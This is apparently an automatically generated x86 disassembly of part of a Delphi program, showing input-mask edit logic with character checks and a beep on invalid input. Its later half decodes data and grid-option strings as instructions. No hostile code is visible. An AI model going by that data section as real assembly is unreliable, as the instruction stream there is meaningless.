call sub_404460
mov edx [ ebp - 0x18 ]
mov eax esi
pop ecx
call sub_40424c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x224 ] 0x20
je r-xdata
mov edi 0x1
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov edi 0x1
inc edi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471c61
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f64
retn
mov eax [ esi ]
call sub_404200
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ esi ]
call sub_404200
mov edx eax
dec edx
mov eax esi
call sub_40458c
inc edi
dec ebx
jne r-xdata
push esi
mov eax [ esi ]
call sub_404200
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ esi ]
mov edx [ ebp - 0xc ]
call sub_404460
jmp r-xdata
inc [ ebp - 0xc ]
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx edi
call sub_46fa60
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
dec eax
sub al 0x2
jae r-xdata
mov edi 0x1
mov eax [ ebp - 0x8 ]
sub eax edi
mov edx [ esi ]
mov al [ edx + eax ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov eax esi
call j_sub_40440c
mov [ eax + edi - 0x1 ] 0x20
inc edi
dec ebx
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
sub_471c68
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov bl 0x1
cmp [ esi + 0x220 ] 0x0
je r-xdata
test bl bl
jne r-xdata
xor ebx ebx
mov edx edi
mov eax [ esi + 0x220 ]
call sub_47003c
mov edi eax
test edi edi
jl r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
call MessageBeep
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46fa60
mov [ esp ] al
mov al [ ebp ]
mov [ esp + 0x1 ] al
mov edx ebp
mov ecx edi
mov eax esi
call sub_471dfc
mov ebx eax
test bl bl
jne r-xdata
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
mov cl [ esp + 0x1 ]
mov edx edi
mov eax esi
call sub_4724dc
mov edi eax
test edi edi
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46ffe8
mov edi eax
mov edx edi
mov eax esi
call sub_470ea4
jmp r-xdata
sub_471d1c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_471dea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_46ffe8
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_404200
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jle r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax - 0x1 ]
call sub_402918
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax ]
call sub_402918
pop edx
cmp dl al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_47096c
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_40c380
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ esi ]
call sub_47096c
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x1 ]
call sub_40c380
cmp al 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471df1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
sub_471dfc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4720ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_46fa60
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_46fbb4
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
movzx eax [ eax + edx - 0x1 ]
cmp eax 0x43
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
call sub_46fc30
mov [ ebx ] al
jmp r-xdata
sub eax 0x4c
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4720b5
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_403f64
retn
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x15
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x23
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_403fd8
lea eax [ ebp - 0x10 ]
call j_sub_40440c
mov dl [ ebx ]
mov [ eax ] dl
mov al [ ebx ]
call sub_471d04
test al al
je r-xdata
push ebp
mov al [ ebx ]
call sub_471d1c
pop ecx
test al al
je r-xdata
sub eax 0x2
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
je r-xdata
push ebp
mov al [ ebx ]
call sub_471d1c
pop ecx
test al al
je r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0xd
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub eax 0x9
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_403fd8
lea eax [ ebp - 0x10 ]
call j_sub_40440c
mov dl [ ebx ]
mov [ eax ] dl
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x20
je r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0x9
je r-xdata
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x41
je r-xdata
jmp r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_408010
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_403fd8
jmp r-xdata
cmp [ ebx ] 0x2b
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
sub eax 0x8
je r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_408010
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_403fd8
jmp r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaNumericA
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x61
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_408044
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
call sub_403fd8
cmp [ ebx ] 0x2d
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_408044
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_403fd8
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_4720c3
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov [ esp + 0x8 ] 0x1
mov [ esp + 0xc ] 0x1
mov eax [ ebp + 0x220 ]
call sub_404200
mov esi eax
test esi esi
jle r-xdata
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc edi
dec esi
jne r-xdata
cmp bl 0x4
jne r-xdata
mov eax [ ebp + 0x220 ]
mov edx edi
call sub_46fa60
mov ebx eax
mov eax ebx
dec eax
sub al 0x2
jb r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp + 0x224 ]
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0xc ]
dec eax
mov edx [ esp + 0x4 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
inc [ esp + 0xc ]
mov eax [ ebp + 0x220 ]
cmp [ eax + edi - 0x1 ] 0x43
je r-xdata
sub_472180
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test eax eax
je r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x8 ]
inc ebx
add eax ebx
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_47003c
mov esi eax
test esi esi
jl r-xdata
mov eax [ edi + 0x220 ]
call sub_404200
sub eax esi
jl r-xdata
inc eax
xchg esi eax
mov [ ebp - 0x14 ] eax
add al 0xfc
sub al 0x2
jae r-xdata
inc ebx
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call j_sub_40440c
mov dl [ edi + 0x224 ]
mov [ eax + ebx - 0x1 ] dl
inc ebx
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x14 ]
call sub_46fa60
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
sub_472218
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4724c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4724cf
lea eax [ ebp - 0x34 ]
mov edx 0x8
call sub_403f64
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
mov ebx 0x1
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_403fd8
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x220 ]
call sub_47003c
mov edi eax
test edi edi
jl r-xdata
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_404200
cmp edi eax
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46fa60
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x10 ]
call sub_404200
add eax [ ebp + 0x8 ]
cmp eax [ esi + 0x228 ]
jge r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
mov [ ebp - 0x11 ] al
lea edx [ ebp - 0x11 ]
mov ecx edi
mov eax esi
call sub_471dfc
test al al
jne r-xdata
dec eax
sub al 0x2
jae r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_40c380
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_404200
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40c380
cmp al 0x2
jne r-xdata
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax ebx
cmp eax [ esi + 0x228 ]
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ esi + 0x228 ]
sub ecx edi
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404460
mov eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_404460
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
pop ecx
call sub_40424c
inc edi
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_404460
push [ ebp - 0x28 ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
call sub_404200
add eax [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx eax
push edx
mov eax [ ebp - 0x10 ]
call sub_404200
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
pop ecx
call sub_404460
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042c0
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov dl [ esi + 0x224 ]
call sub_404128
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_404208
inc ebx
lea eax [ ebp - 0x10 ]
call j_sub_40440c
mov dl [ ebp - 0x11 ]
mov [ eax + ebx - 0x1 ] dl
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
mov al [ esi + 0x224 ]
mov [ ebp - 0x11 ] al
lea eax [ ebp - 0x10 ]
call j_sub_40440c
mov dl [ esi + 0x224 ]
mov [ eax + ebx ] dl
mov eax [ ebp - 0x10 ]
call sub_404200
cmp eax ebx
jl r-xdata
add ebx [ ebp + 0x8 ]
dec ebx
mov [ ebp - 0x8 ] ebx
inc ebx
inc ebx
inc edi
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404460
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0x11 ]
call sub_404128
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_404200
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_404460
push [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4042c0
inc edi
sub_4724dc
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
or ebp 0xffffffff
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_404200
cmp edi eax
jl r-xdata
inc edi
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46fa60
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x220 ]
mov dl [ edx + edi - 0x1 ]
cmp al 0x2
jne r-xdata
cmp bl dl
jne r-xdata
mov eax edx
call sub_46fc30
mov edx eax
mov ebp edi
jmp r-xdata
sub_472538
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47255d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472564
retn
sub_472574
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc004725
add [ eax ] al
add [ edx + esi * 2 + 0x40 ] cl
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ 0x766e4945 ] dl
popad
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x704f6469
jb r-xdata
add [ eax - 0x3fffbc10 ] al
and eax [ eax + eax - 0x68 ]
je r-xdata
add [ edx ] cl
add [ ecx ] bl
mov al 0x87
add [ edx ] al
add eax [ eax ]
add eax [ ebx ]
add ebp ecx
jmp edx
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax - 0x58 ] ax
pushad
inc ebx
add [ eax + 0x62 ] cl
inc ebx
add [ edx ] al
inc ebx
add ah cl
arpl [ ebx ] ax
js r-xdata
stc
inc ebx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax + 0x38004740 ] cl
push 0x44
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx + 0x60c80044 ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
add al cl
inc esi
inc edi
add [ eax ] ah
pop ds
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add [ eax ] bh
and al 0x44
add ah cl
sub al [ eax + eax + 0x6c ]
cmp [ eax + eax - 0x18 ] al
inc eax
inc edi
add [ 0x65940043 ] ah
inc ebx
add [ ecx + edi ] al
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax ] bh
inc bx
add [ esp + 0x44 ] ah
add [ eax + 0x14004441 ] dh
jbe r-xdata
outsd
outsb
mov eax eax
and [ esi ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] ah
inc edi
add [ edx + 0x27 ] ah
inc edi
add [ eax + 0x2 ] cl
add [ eax ] al
les eax [ edi + eax * 2 ]
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
pop esp
inc ebx
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
sbb al 0x22
inc esp
add [ edi + ebp * 2 ] ah
inc esp
add [ edi + esi ] cl
inc esp
add [ eax - 0x5fffbe7c ] ch
sbb al 0x44
inc edi
add [ esi + eax * 2 + 0x540c0047 ] ch
dec ecx
outsb
jo r-xdata
inc ebx
add [ eax ] ch
bound eax [ ebx ]
push esp
adc [ edi ] eax
xor [ ebx + 0x43 ] ah
add ah dl
inc ecx
inc edi
add [ eax + 0x11 ] ah
inc edi
add ah cl
and [ edi ] al
adc [ edx ] bl
inc edi
add [ eax + 0x19 ] dh
inc edi
add ah bh
dec eax
inc edi
add [ ecx + ecx * 2 + 0x47 ] ah
outsd
push esi
popad
arpl [ ebp + 0x45 ] sp
imul esi [ fs : eax + edx * 4 + 0x74 ] 0x7004727
or al 0x54
dec ecx
outsb
jo r-xdata
outsd
dec esp
imul ebp [ esi + 0x65 ] 0x486f670a
outsd
jb r-xdata
or eax 0x61526f67
popad
arpl [ ebp + 0x45 ] sp
imul esi [ fs : eax + 0x26 ] 0x6800047
inc edi
add [ eax + eax ] cl
add eax 0x64697247
jae r-xdata
add al [ eax ]
add [ eax ] al
cwde
sub [ edi ] al
or ah [ edi + 0x64 ]
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] esp
inc esi
insb
arpl [ gs : edx + edx + 0x67 ] si
outsd
inc ecx
insb
ja r-xdata
jns r-xdata
outsb
push ebx
insb
arpl [ gs : ebx + edx + 0x67 ] si
outsd
inc esp
jb r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x526f670d
popad
popad
ja r-xdata
add [ eax + 0x3004727 ] bl
or edx [ edi + eax * 2 + 0x72 ]
imul esp [ edi + ecx * 2 + 0x70 ] 0x6e6f6974
add [ eax ] eax
add [ eax ] al
add [ esi ] cl
add [ eax ] al
add [ edi + 0x670f0047 ] dl
outsd
inc esi
imul edi [ eax + 0x65 ] 0x72655664
je r-xdata
outsb
inc esp
jb r-xdata
jae r-xdata
push cs
add [ esi ] al
push ebx
push 0x6445776f
imul esi [ edi + ebp * 2 + 0x72 ] 0x546f670f
push edx
outsd
ja r-xdata
push es
outsd
outsd
arpl [ ebp + 0x73 ] si
push ebx
insb
push edx
outsd
ja r-xdata
outsd
imul ebp [ esi + 0x65 ] 0x466f670f
imul edi [ eax + 0x65 ] 0x726f4864
jpe r-xdata
add al 0x8
insb
insb
inc ebp
jbe r-xdata
ja r-xdata
jae r-xdata
inc esi
imul edi [ eax + 0x65 ] 0x72470564
imul esp [ ebx + esi * 2 - 0x2c ] 0x6004728
pop es
push esp
inc edi
jb r-xdata
arpl [ ebx + 0x69 ] bp
outsb
add eax 0x64697247
push 0x54626d75
jb r-xdata
inc ebp
imul esi [ fs : edi + ebp * 2 + 0x72 ] 0x546f670f
imul edi [ edx + 0x69 ] 0x670b676e
outsd
inc ebx
outsd
insb
push ebx
imul edi [ edx + 0x69 ] 0x670b676e
outsd
push edx
outsd
ja r-xdata
jb r-xdata
imul ebp [ esi + 0x65 ] 0x566f670a
add [ ecx + eax * 2 ] al
inc ebx
outsd
insb
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
inc ecx
outsb
je r-xdata
outsb
add [ eax ] cl
adc [ ebx + edx * 2 + 0x65 ] dl
insb
arpl [ gs : ebx + eax * 2 + 0x65 ] si
je r-xdata
or [ esi ] cl
push esp
inc esp
jb r-xdata
add eax 0x64697247
jae r-xdata
arpl [ gs : ebp + 0x64 ] si
or esp [ edi + 0x6f ]
sub [ edi ] al
push es
or al 0x54
inc edi
jb r-xdata
jae r-xdata
imul ebp [ ecx + 0x6e ] 0x67
add eax 0x64697247
outsd
jbe r-xdata
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add al dl
sub [ edi ] al
lea eax [ eax ]
pushad
sub al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edi + eax * 2 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
outsd
arpl [ ebp + 0x73 ] si
pop es
inc esi
shl [ ecx + ebp ] 0x47
inc ebp
imul esi [ fs : ebx + edx * 2 + 0x74 ] 0x1656c79
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
in al dx
dec edi
jo r-xdata
inc edi
add [ eax + r-xdata ] dl
add eax [ edx ]
xor eax [ cs : ecx ]
outsb
or esp [ bx + 0x6f ]
inc ebx
outsd
insb
dec ebp
outsd
jbe r-xdata
add al 0x41
push edx
outsd
ja r-xdata
add al 0x41
push edx
outsd
ja r-xdata
add [ ecx + eax * 2 ] al
inc ebx
outsd
insb
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
inc ecx
push es
push ebx
outsb
jb r-xdata
add [ eax - 0x72ffb8d8 ] ebx
inc eax
add al dh
sub [ edi ] al
add ecx [ edx ]
push esp
inc esp
add [ ecx + edx * 2 - 0x7b57ffb9 ] ah
inc ecx
add [ eax - 0x7fffbbe4 ] ah
inc edi
add [ edx + eax - 0x41c80000 ] dl
inc ebx
add [ eax - 0x12 ] cl
add eax 0x74617453
push cs
insb
insb
inc ebp
jbe r-xdata
insb
insb
imul esi [ eax + 0x73 ] 0x650a7369
jae r-xdata
sub [ edi ] al
or [ ebp + 0x73 ] ah
push ebx
imul ebp [ ebp + 0x70 ] 0x650a656c
jae r-xdata
add [ eax ] al
add ah ch
imul ebp [ edi + 0x6e ] 0x27940373
add [ eax ] al
add [ eax ] al
push esp
popad
bound esi [ ebx + 0xb ]
outsd
outsb
or [ bx + 0x6f ] esp
inc ebp
imul esi [ fs : ecx + ebp * 2 + 0x6e ] 0x6f670667
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
add [ ecx ] ecx
dec ecx
outsb
je r-xdata
add [ eax ] al
dec eax
sub eax [ edi ]
jo r-xdata
jb r-xdata
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
add al ah
cmp eax 0x1f200044
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add [ eax ] bh
and al 0x44
add ah cl
sub al [ eax + eax + 0x6c ]
cmp [ eax + eax - 0x74 ] al
add [ edi ] sub_443554
test [ ebx ] dh
inc esp
add [ ecx + edi ] al
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax + 0x37 ] ch
inc esp
add [ esp + 0x44 ] ah
add [ eax + 0x14004481 ] al
jbe r-xdata
inc edi
add [ edi + ebp * 2 ] ah
add [ eax + 0x4b ] dh
inc esp
jb r-xdata
inc edi
add [ ebp + 0x2a600040 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x472c ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2b ] cl
inc edi
add [ eax + 0x2c ] dh
je r-xdata
outsb
jb r-xdata
imul esp [ ebx + 0x6b ] 0x7473694c
inc esp
aas
enter 0x4033 0x0
je r-xdata
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
cmp [ esi - 0x11b7ffbd ] bh
jb r-xdata
jb r-xdata
add al [ eax + eax + 0x70020 ]
add eax 0x15011300
add [ edi + edi * 8 - 0x2a0046 ] edi
aam 0xff
sar edi cl
mov bl 0xff
sar edi 0xb2
push [ ecx - 0x1e004f01 ]
jmp eax
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax + 0x4c ] ax
pop edx
inc edi
add [ eax + 0x7c004764 ] ah
add [ edi ] sub_474ecc
insb
sub [ eax ] eax
test al 0x53
inc edi
add [ esi + ebx * 4 - 0x612fffb9 ] ch
inc edi
add [ ecx ] dh
add [ eax + esi * 4 ] al
push cs
mov al 0x10
mov al 0x1c
mov al 0x1e
mov al 0x19
mov al 0x2
add [ edi ] ebx
add [ ecx ] dl
add [ edi + 0x8011400 ] eax
add [ ecx ] al
add [ eax ] ah
xor [ eax ] eax
jo r-xdata
ja r-xdata
inc ebx
popad
outsb
push ebx
insb
arpl [ gs : edi + eax + 0x42 ] si
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
pushfd
